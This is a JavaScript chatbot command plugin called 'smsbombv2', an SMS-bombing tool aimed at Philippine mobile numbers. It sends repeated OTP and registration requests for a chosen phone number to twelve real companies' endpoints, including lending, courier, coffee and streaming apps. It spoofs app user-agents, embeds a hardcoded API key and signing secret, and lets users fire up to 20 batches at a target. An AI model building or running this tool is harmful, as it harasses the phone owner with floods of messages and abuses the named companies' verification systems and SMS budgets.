import axios from 'axios';
import crypto from 'crypto';

export const meta = {
  name: 'smsbombv2',
  aliases: ['bomb', 'smsblast'],
  version: '6.0.0',
  author: 'selov',
  description: 'SMS bombing tool for Philippine numbers (30‑min cooldown per number)',
  guide: [
    ' <phone> <amount>',
    'Example: /smsbomb 9123456789 5'
  ],
  cooldown: 5, // Global cooldown disabled – using per‑phone timer
  type: 'premium',
  category: 'tools'
};

// Store last usage time for each phone number (global, resets on restart)
if (!global.phoneTimers) global.phoneTimers = new Map();
const phoneTimers = global.phoneTimers;
const COOLDOWN_MINUTES = 30;
const COOLDOWN_MS = COOLDOWN_MINUTES * 60 * 1000;

// ─── Helper functions ─────────────────────────────────────────────────────────
const formatPhone = (phone) => {
  phone = phone.toString().trim().replace(/[\s\-+]/g, '');
  if (phone.startsWith('0')) phone = phone.slice(1);
  if (phone.startsWith('63')) phone = phone.slice(2);
  return phone;
};

const validatePhone = (phone) => {
  const cleanPhone = formatPhone(phone);
  return /^9\d{9}$/.test(cleanPhone);
};

const randomString = (length) => {
  return crypto.randomBytes(Math.ceil(length/2))
    .toString('hex')
    .slice(0, length);
};

const generateKumuSignature = (timestamp, randomStr, phoneNumber) => {
  const secret = "kumu_secret_2024";
  const data = `${timestamp}${randomStr}${phoneNumber}${secret}`;
  return crypto.createHash('sha256').update(data).digest('hex');
};

const formatRemainingTime = (ms) => {
  const minutes = Math.floor(ms / 60000);
  const seconds = Math.floor((ms % 60000) / 1000);
  return `${minutes} minute${minutes !== 1 ? 's' : ''} and ${seconds} second${seconds !== 1 ? 's' : ''}`;
};

// ─── Service definitions (12 services) ────────────────────────────────────────
const services = [
  {
    name: "MWELL ULTRA",
    func: async (phone) => {
      try {
        const API_URL = "https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number";
        const API_KEY = "0a57846786b34b0a89328c39f584892b";
        const formattedPhone = formatPhone(phone);
        const headers = {
          'User-Agent': 'okhttp/4.11.0',
          'Content-Type': 'application/json',
          'ocp-apim-subscription-key': API_KEY,
          'x-app-version': '03.942.035',
          'x-device-type': 'android',
          'x-device-model': 'oneplus CPH2465'
        };
        const data = {
          "country": "PH",
          "phoneNumber": formattedPhone,
          "phoneNumberPrefix": "+63"
        };
        const response = await axios.post(API_URL, data, { headers, timeout: 8000 });
        return response.status === 200;
      } catch {
        return false;
      }
    }
  },
  {
    name: "EZLOAN",
    func: async (phone) => {
      try {
        const formattedPhone = formatPhone(phone);
        const currentTime = Date.now();
        const headers = {
          'User-Agent': 'okhttp/4.9.2',
          'Content-Type': 'application/json',
          'blackbox': `kGPGg${currentTime}DCl3O8MVBR0`
        };
        const data = {
          "businessId": "EZLOAN",
          "contactNumber": `+63${formattedPhone}`,
          "appsflyerIdentifier": `${currentTime}`
        };
        const response = await axios.post('https://gateway.ezloancash.ph/security/auth/otp/request', data, { headers, timeout: 8000 });
        return response.status === 200 && response.data?.code === 0;
      } catch {
        return false;
      }
    }
  },
  {
    name: "XPRESS PH",
    func: async (phone) => {
      try {
        const headers = {
          'User-Agent': 'Dalvik/2.1.0',
          'Content-Type': 'application/json'
        };
        const timestamp = Math.floor(Date.now() / 1000);
        const data = {
          "FirstName": `U${timestamp}`,
          "LastName": "T",
          "Email": `u${timestamp}@gm.com`,
          "Phone": `+63${formatPhone(phone)}`,
          "Password": "Pass123!",
          "ConfirmPassword": "Pass123!"
        };
        const response = await axios.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", data, { headers, timeout: 8000 });
        return response.status === 200;
      } catch {
        return false;
      }
    }
  },
  {
    name: "ABENSON",
    func: async (phone) => {
      try {
        const headers = {
          'User-Agent': 'okhttp/4.9.0',
          'Content-Type': 'application/x-www-form-urlencoded'
        };
        const data = `contact_no=${phone}&login_token=undefined`;
        const response = await axios.post('https://api.mobile.abenson.com/api/public/membership/activate_otp', data, { headers, timeout: 8000 });
        return response.status === 200;
      } catch {
        return false;
      }
    }
  },
  {
    name: "EXCELLENT LENDING",
    func: async (phone) => {
      try {
        const headers = {
          'User-Agent': 'okhttp/4.12.0',
          'Content-Type': 'application/json'
        };
        const data = {
          "domain": phone,
          "cat": "login",
          "previous": false,
          "financial": randomString(32)
        };
        const response = await axios.post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', data, { headers, timeout: 8000 });
        return response.status === 200;
      } catch {
        return false;
      }
    }
  },
  {
    name: "BISTRO",
    func: async (phone) => {
      try {
        const formattedPhone = formatPhone(phone);
        const headers = {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 16)',
          'x-requested-with': 'com.allcardtech.bistro'
        };
        const url = `https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63${formattedPhone}`;
        const response = await axios.get(url, { headers, timeout: 8000 });
        return response.status === 200 && response.data?.isSuccessful;
      } catch {
        return false;
      }
    }
  },
  {
    name: "WEMOVE",
    func: async (phone) => {
      try {
        const headers = {
          'User-Agent': 'okhttp/4.9.3',
          'Content-Type': 'application/json'
        };
        const data = {
          "phone_country": '+63',
          "phone_no": formatPhone(phone)
        };
        const response = await axios.post('https://api.wemove.com.ph/auth/users', data, { headers, timeout: 8000 });
        return response.status === 200;
      } catch {
        return false;
      }
    }
  },
  {
    name: "LBC CONNECT",
    func: async (phone) => {
      try {
        const headers = {
          'User-Agent': 'Dart/2.19',
          'Content-Type': 'application/x-www-form-urlencoded'
        };
        const data = {
          'verification_type': 'mobile',
          'client_contact_no': formatPhone(phone)
        };
        const response = await axios.post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', data, { headers, timeout: 8000 });
        return response.status === 200;
      } catch {
        return false;
      }
    }
  },
  {
    name: "PICKUP COFFEE",
    func: async (phone) => {
      try {
        const headers = {
          'User-Agent': 'okhttp/4.12.0',
          'Content-Type': 'application/json'
        };
        const data = {
          "mobile_number": `+63${formatPhone(phone)}`,
          "login_method": 'mobile_number'
        };
        const response = await axios.post('https://production.api.pickup-coffee.net/v2/customers/login', data, { headers, timeout: 8000 });
        return response.status === 200;
      } catch {
        return false;
      }
    }
  },
  {
    name: "HONEY LOAN",
    func: async (phone) => {
      try {
        const headers = {
          'User-Agent': 'Mozilla/5.0',
          'Content-Type': 'application/json'
        };
        const data = {
          "phone": phone,
          "is_rights_block_accepted": 1
        };
        const response = await axios.post('https://api.honeyloan.ph/api/client/registration/step-one', data, { headers, timeout: 8000 });
        return response.status === 200 && response.data?.success;
      } catch {
        return false;
      }
    }
  },
  {
    name: "KUMU PH",
    func: async (phone) => {
      try {
        const formattedPhone = formatPhone(phone);
        const ts = Math.floor(Date.now() / 1000);
        const sig = generateKumuSignature(ts, randomString(32), formattedPhone);
        const headers = { 'Content-Type': 'application/json' };
        const data = {
          "country_code": "+63",
          "cellphone": formattedPhone,
          "encrypt_signature": sig,
          "encrypt_timestamp": ts
        };
        const response = await axios.post('https://api.kumuapi.com/v2/user/sendverifysms', data, { headers, timeout: 8000 });
        return response.status === 200 || response.status === 403;
      } catch {
        return false;
      }
    }
  },
  {
    name: "S5.COM",
    func: async (phone) => {
      try {
        const normalizedPhone = `+63${formatPhone(phone)}`;
        const boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
        const headers = {
          'Content-Type': `multipart/form-data; boundary=${boundary}`
        };
        const body = `--${boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n${normalizedPhone}\r\n--${boundary}--\r\n`;
        const response = await axios.post('https://api.s5.com/player/api/v1/otp/request', body, { headers, timeout: 8000 });
        return response.status === 200;
      } catch {
        return false;
      }
    }
  }
];

// ─── Main command handler ─────────────────────────────────────────────────────
export async function onStart({ args, response, usage }) {
  try {
    // Parse arguments
    const phone = args[0];
    const amount = args[1] ? parseInt(args[1]) : 1;

    // Validate phone
    if (!phone) {
      return usage();
    }

    if (!validatePhone(phone)) {
      return response.reply(
        '❌ Invalid phone number!\n' +
        'Please provide a valid 10‑digit Philippine mobile number.\n' +
        '📱 Format: 9123456789',
        { parse_mode: 'Markdown' }
      );
    }

    if (isNaN(amount) || amount < 1 || amount > 20) {
      return response.reply('❌ Amount must be between 1‑20.');
    }

    const formattedPhone = formatPhone(phone);
    const fullPhoneNumber = `+63${formattedPhone}`;

    // Check per‑phone cooldown
    const lastUsed = phoneTimers.get(fullPhoneNumber);
    const now = Date.now();

    if (lastUsed) {
      const timeElapsed = now - lastUsed;
      if (timeElapsed < COOLDOWN_MS) {
        const remainingTime = COOLDOWN_MS - timeElapsed;
        const formattedTime = formatRemainingTime(remainingTime);
        
        return response.reply(
          `⏳ Cooldown Active\n━━━━━━━━━━━━━━━━\n` +
          `📞 Phone: ${fullPhoneNumber}\n` +
          `⏱️ Please wait: ${formattedTime}\n` +
          `━━━━━━━━━━━━━━━━\n` +
          `You can use this number again after ${COOLDOWN_MINUTES} minutes.`,
          { parse_mode: 'Markdown' }
        );
      }
    }

    // Update last used time
    phoneTimers.set(fullPhoneNumber, now);

    const totalServices = services.length;
    const totalRequests = amount * totalServices;

    // Send initial message and keep its ID for editing
    const waitingMsg = await response.reply(
      `📱 SMS BOMB IN PROGRESS\n━━━━━━━━━━━━━━━━\n` +
      `📞 Target: ${fullPhoneNumber}\n` +
      `📊 Batches: ${amount}\n` +
      `⚡ Total Requests: ${totalRequests}\n` +
      `━━━━━━━━━━━━━━━━\n` +
      `⏳ Please wait...`,
      { parse_mode: 'Markdown' }
    );

    let successCount = 0;
    let failCount = 0;
    const results = [];

    // Execute all batches
    for (let batch = 1; batch <= amount; batch++) {
      const promises = services.map(async (service) => {
        try {
          const result = await service.func(phone);
          if (result) {
            successCount++;
            results.push(`✅ ${service.name}`);
          } else {
            failCount++;
            results.push(`❌ ${service.name}`);
          }
        } catch {
          failCount++;
          results.push(`❌ ${service.name}`);
        }
      });

      await Promise.allSettled(promises);

      // Delay between batches
      if (batch < amount) {
        await new Promise(resolve => setTimeout(resolve, 3000));
      }
    }

    const successRate = ((successCount / totalRequests) * 100).toFixed(1);
    const resultSummary = results.join('\n');

    const finalMsg = 
      `📱 SMS BOMB COMPLETE\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📞 Target: ${fullPhoneNumber}\n` +
      `📊 Batches: ${amount}\n` +
      `⚡ Total Requests: ${totalRequests}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `✅ Successful: ${successCount}\n` +
      `❌ Failed: ${failCount}\n` +
      `📈 Success Rate: ${successRate}%\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `⏱️ Next attempt available in: ${COOLDOWN_MINUTES} minutes\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `Results:\n${resultSummary}\n` +
      `━━━━━━━━━━━━━━━━━━`;

    await response.edit(waitingMsg, finalMsg, { parse_mode: 'Markdown' });

  } catch (err) {
    console.error('SMS Bomb Error:', err);
    response.reply(`❌ Error: ${err.message}`);
  }
}
